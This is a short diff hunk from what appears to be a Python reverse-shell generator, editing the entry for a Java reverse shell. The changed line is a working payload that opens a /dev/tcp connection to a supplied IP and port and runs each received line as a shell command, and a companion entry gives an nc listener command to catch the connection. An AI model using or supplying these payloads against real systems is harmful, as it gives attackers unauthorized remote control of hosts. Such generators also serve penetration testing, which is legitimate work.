@@ -89,7 +89,7 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "description":
         "Java reverse shell",
         "reverse":
-        'r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();'
+        'r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor();'
         % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -lvnp %d" % (port),
